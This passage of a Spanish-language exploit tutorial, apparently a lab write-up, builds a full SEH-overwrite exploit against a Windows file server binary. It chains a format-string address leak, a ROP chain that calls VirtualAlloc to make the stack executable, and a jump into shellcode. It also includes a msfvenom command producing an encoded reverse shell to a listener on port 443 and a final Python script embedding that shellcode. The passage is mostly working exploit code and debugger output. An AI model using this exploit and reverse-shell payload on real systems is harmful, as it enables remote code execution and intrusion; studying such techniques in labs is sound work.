+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0100f</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
+</span><span class="c1"># $esi = jmp eax</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x14af9</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
+</span><span class="c1"># $edi = ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="c1"> # ret;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con todos los registros establecidos podemos ejecutar el <code class="language-plaintext highlighter-rouge">pushad; ret;</code>, luego de salir de <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> ejecutaremos un simple <code class="language-plaintext highlighter-rouge">jmp esp</code> para ejecutar el shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1"># call VirtualAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x113b1</span><span class="p">)</span><span class="c1"> # pushad; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x11394</span><span class="p">)</span><span class="c1"> # jmp esp;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro exploit ahora se ve así, si todo funciona correctamente el ropchain llamará a la función <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> y saltará al shellcode que por ahora son simplemente <code class="language-plaintext highlighter-rouge">C's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">
+
+rop</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 30</span><span class="c1"> # ret;
+# $ecx = 0x40</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # 0x40 + offset</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x48ca8</span><span class="p">)</span><span class="c1"> # xchg edi, eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15638</span><span class="p">)</span><span class="c1"> # mov ecx, edi; call esi;
+# $edx = 0x1000</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314d26b</span><span class="p">)</span><span class="c1">            # offset + 0x1000</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3039f</span><span class="p">)</span><span class="c1"> # mov edx, eax; mov eax, esi; pop esi; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x41414141</span><span class="p">)</span><span class="c1">            # padding for pop
+# $ebx = 0x1</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0dc14</span><span class="p">)</span><span class="c1"> # pop ebx; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffffff</span><span class="p">)</span><span class="c1">            # -1</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x301e9</span><span class="p">)</span><span class="c1"> # inc ebx; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x301e9</span><span class="p">)</span><span class="c1"> # inc ebx; ret;
+# $ebp = pop ebp; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0100f</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0100f</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
+</span><span class="c1"># $esi = jmp eax</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x14af9</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
+</span><span class="c1"># $eax = VirtualAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="p"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffcec0</span><span class="p">)</span><span class="c1">            # VirtualAlloc() - TlsAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x9013c</span><span class="p">)</span><span class="c1"> # TlsAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x2bb8e</span><span class="p">)</span><span class="c1"> # mov eax, dword ptr [eax]; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x113a8</span><span class="p">)</span><span class="c1"> # add eax, edi; ret;
+# $edi = ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="c1"> # ret;
+# call VirtualAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x113b1</span><span class="p">)</span><span class="c1"> # pushad; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x11394</span><span class="p">)</span><span class="c1"> # jmp esp;</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C" </span><span class="o">*</span><span class="mi"> 100</span><span class="p">
+
+offset</span><span class="o"> =</span><span class="mi"> 1032</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(rop</span><span class="o"> +</span><span class="p"> shellcode))
+
+nseh</span><span class="o"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+seh</span><span class="o"> =</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x11396</span><span class="p">)</span><span class="c1"> # add esp, 0xe10; ret;</span><span class="p">
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> rop
+payload</span><span class="o"> +=</span><span class="p"> shellcode
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">4000</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST "</span><span class="o"> +</span><span class="p"> payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para ver que funcione podemos establecer un breakpoint en <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, cuando llega ahi podemos comprobar que los parametros esten establecidos correctamente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> bp kernel32!VirtualAllocStub  
+
+</span><span class="ro">0:000></span><span class="p"> dds esp + 4 L4
+0194f700  0194f714
+0194f704  00000001
+0194f708  00001000
+0194f70c  00000040</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Luego de ejecutar la función si volvemos a ver la protección del stack en lugar de <code class="language-plaintext highlighter-rouge">0x4</code> ahora tenemos el valor <code class="language-plaintext highlighter-rouge">0x40</code> que es equivalente al valor de <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> pt
+eax=0194f000 ebx=00000001 ecx=4e7f0000 edx=0194f000 esi=3f2a4af9 edi=3f291010  
+eip=75f1274c esp=0194f6fc ebp=3f29100f iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+KERNELBASE!VirtualAlloc+0x4c:
+75f1274c c21000          ret     10h
+
+</span><span class="ro">0:000></span><span class="p"> !vprot esp
+BaseAddress:       0194f000
+AllocationBase:    01850000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000040  PAGE_EXECUTE_READWRITE
+Type:              00020000  MEM_PRIVATE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si continuamos la ejecución llegaremos al <code class="language-plaintext highlighter-rouge">jmp esp</code> que ejecutará nuestras <code class="language-plaintext highlighter-rouge">C's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> pt
+eax=0194f000 ebx=00000001 ecx=4e7f0000 edx=0194f000 esi=3f2a4af9 edi=3f291010  
+eip=3f291010 esp=0194f714 ebp=756c6250 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+filesrv+0x1010:
+3f291010 c3              ret
+
+</span><span class="ro">0:000></span><span class="p"> p
+eax=0194f000 ebx=00000001 ecx=4e7f0000 edx=0194f000 esi=3f2a4af9 edi=3f291010  
+eip=3f2a1394 esp=0194f718 ebp=756c6250 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+filesrv+0x11394:
+3f2a1394 ffe4            jmp     esp {0194f718}
+
+</span><span class="ro">0:000></span><span class="p"> db esp
+0194f718  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0194f728  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0194f738  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0194f748  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0194f758  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0194f768  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0194f778  43 43 43 43 41 41 41 41-41 41 41 41 41 41 41 41  CCCCAAAAAAAAAAAA
+0194f788  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que podemos ejecutar un shellcode con este exploit solo nos queda generar un nuevo shellcode usando <code class="language-plaintext highlighter-rouge">msfvenom</code> que envie una reverse shell por el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -b </span><span class="am">'\x00\x09\x0a\x0b\x0c\x0d\x20\x25'</span><span class="p"> -f python -v shellcode -e x86/shikata_ga_nai -n 16  
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Successfully added NOP sled of size 16 from x86/single_byte
+Payload size: 367 bytes
+Final size of python file: 2063 bytes
+shellcode =  b""
+shellcode += b"\xfd\x99\x4b\x41\xfd\x93\xf9\x27\x43\xf9\x99"
+shellcode += b"\x4b\x90\x40\x92\x90\xbb\x8b\x50\x0f\xbe\xdb"
+shellcode += b"\xd1\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x52\x31"
+shellcode += b"\x5d\x12\x83\xed\xfc\x03\xd6\x5e\xed\x4b\x14"
+shellcode += b"\xb6\x73\xb3\xe4\x47\x14\x3d\x01\x76\x14\x59"
+shellcode += b"\x42\x29\xa4\x29\x06\xc6\x4f\x7f\xb2\x5d\x3d"
+shellcode += b"\xa8\xb5\xd6\x88\x8e\xf8\xe7\xa1\xf3\x9b\x6b"
+shellcode += b"\xb8\x27\x7b\x55\x73\x3a\x7a\x92\x6e\xb7\x2e"
+shellcode += b"\x4b\xe4\x6a\xde\xf8\xb0\xb6\x55\xb2\x55\xbf"
+shellcode += b"\x8a\x03\x57\xee\x1d\x1f\x0e\x30\x9c\xcc\x3a"
+shellcode += b"\x79\x86\x11\x06\x33\x3d\xe1\xfc\xc2\x97\x3b"
+shellcode += b"\xfc\x69\xd6\xf3\x0f\x73\x1f\x33\xf0\x06\x69"
+shellcode += b"\x47\x8d\x10\xae\x35\x49\x94\x34\x9d\x1a\x0e"
+shellcode += b"\x90\x1f\xce\xc9\x53\x13\xbb\x9e\x3b\x30\x3a"
+shellcode += b"\x72\x30\x4c\xb7\x75\x96\xc4\x83\x51\x32\x8c"
+shellcode += b"\x50\xfb\x63\x68\x36\x04\x73\xd3\xe7\xa0\xf8"
+shellcode += b"\xfe\xfc\xd8\xa3\x96\x31\xd1\x5b\x67\x5e\x62"
+shellcode += b"\x28\x55\xc1\xd8\xa6\xd5\x8a\xc6\x31\x19\xa1"
+shellcode += b"\xbf\xad\xe4\x4a\xc0\xe4\x22\x1e\x90\x9e\x83"
+shellcode += b"\x1f\x7b\x5e\x2b\xca\x2c\x0e\x83\xa5\x8c\xfe"
+shellcode += b"\x63\x16\x65\x14\x6c\x49\x95\x17\xa6\xe2\x3c"
+shellcode += b"\xe2\x21\xcd\x69\x88\xf8\xa5\x6b\x50\xfa\x8e"
+shellcode += b"\xe5\xb6\x96\xe0\xa3\x61\x0f\x98\xe9\xf9\xae"
+shellcode += b"\x65\x24\x84\xf1\xee\xcb\x79\xbf\x06\xa1\x69"
+shellcode += b"\x28\xe7\xfc\xd3\xff\xf8\x2a\x7b\x63\x6a\xb1"
+shellcode += b"\x7b\xea\x97\x6e\x2c\xbb\x66\x67\xb8\x51\xd0"
+shellcode += b"\xd1\xde\xab\x84\x1a\x5a\x70\x75\xa4\x63\xf5"
+shellcode += b"\xc1\x82\x73\xc3\xca\x8e\x27\x9b\x9c\x58\x91"
+shellcode += b"\x5d\x77\x2b\x4b\x34\x24\xe5\x1b\xc1\x06\x36"
+shellcode += b"\x5d\xce\x42\xc0\x81\x7f\x3b\x95\xbe\xb0\xab"
+shellcode += b"\x11\xc7\xac\x4b\xdd\x12\x75\x7b\x94\x3e\xdc"
+shellcode += b"\x14\x71\xab\x5c\x79\x82\x06\xa2\x84\x01\xa2"
+shellcode += b"\x5b\x73\x19\xc7\x5e\x3f\x9d\x34\x13\x50\x48"
+shellcode += b"\x3a\x80\x51\x59"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro exploit final inicia sobrescribiendo el controlador <code class="language-plaintext highlighter-rouge">SEH</code> con un stack pivot que retorna a un ropchain el cual llama a <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> para cambiar los privilegios del stack, una vez ye es ejecutable salta al shellcode y ejecuta la reverse shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">
+
+rop</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 30</span><span class="c1"> # ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # 0x40 + offset</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x48ca8</span><span class="p">)</span><span class="c1"> # xchg edi, eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15638</span><span class="p">)</span><span class="c1"> # mov ecx, edi; call esi;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314d26b</span><span class="p">)</span><span class="c1">            # offset + 0x1000</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3039f</span><span class="p">)</span><span class="c1"> # mov edx, eax; mov eax, esi; pop esi; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x41414141</span><span class="p">)</span><span class="c1">            # padding for pop</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0dc14</span><span class="p">)</span><span class="c1"> # pop ebx; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffffff</span><span class="p">)</span><span class="c1">            # -1</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x301e9</span><span class="p">)</span><span class="c1"> # inc ebx; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x301e9</span><span class="p">)</span><span class="c1"> # inc ebx; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0100f</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0100f</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x14af9</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="p"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffcec0</span><span class="p">)</span><span class="c1">            # VirtualAlloc() - TlsAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x9013c</span><span class="p">)</span><span class="c1"> # TlsAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x2bb8e</span><span class="p">)</span><span class="c1"> # mov eax, dword ptr [eax]; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x113a8</span><span class="p">)</span><span class="c1"> # add eax, edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="c1"> # ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x113b1</span><span class="p">)</span><span class="c1"> # pushad; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x11394</span><span class="p">)</span><span class="c1"> # jmp esp;</span><span class="p">
+
+shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfd\x99\x4b\x41\xfd\x93\xf9\x27\x43\xf9\x99</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4b\x90\x40\x92\x90\xbb\x8b\x50\x0f\xbe\xdb</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd1\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x52\x31</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5d\x12\x83\xed\xfc\x03\xd6\x5e\xed\x4b\x14</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb6\x73\xb3\xe4\x47\x14\x3d\x01\x76\x14\x59</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x29\xa4\x29\x06\xc6\x4f\x7f\xb2\x5d\x3d</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa8\xb5\xd6\x88\x8e\xf8\xe7\xa1\xf3\x9b\x6b</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb8\x27\x7b\x55\x73\x3a\x7a\x92\x6e\xb7\x2e</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4b\xe4\x6a\xde\xf8\xb0\xb6\x55\xb2\x55\xbf</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x8a\x03\x57\xee\x1d\x1f\x0e\x30\x9c\xcc\x3a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x79\x86\x11\x06\x33\x3d\xe1\xfc\xc2\x97\x3b</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\x69\xd6\xf3\x0f\x73\x1f\x33\xf0\x06\x69</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x47\x8d\x10\xae\x35\x49\x94\x34\x9d\x1a\x0e</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x90\x1f\xce\xc9\x53\x13\xbb\x9e\x3b\x30\x3a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x72\x30\x4c\xb7\x75\x96\xc4\x83\x51\x32\x8c</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x50\xfb\x63\x68\x36\x04\x73\xd3\xe7\xa0\xf8</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfe\xfc\xd8\xa3\x96\x31\xd1\x5b\x67\x5e\x62</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x28\x55\xc1\xd8\xa6\xd5\x8a\xc6\x31\x19\xa1</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xbf\xad\xe4\x4a\xc0\xe4\x22\x1e\x90\x9e\x83</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1f\x7b\x5e\x2b\xca\x2c\x0e\x83\xa5\x8c\xfe</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x63\x16\x65\x14\x6c\x49\x95\x17\xa6\xe2\x3c</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe2\x21\xcd\x69\x88\xf8\xa5\x6b\x50\xfa\x8e</span><span class="s">"</span><span class="p">
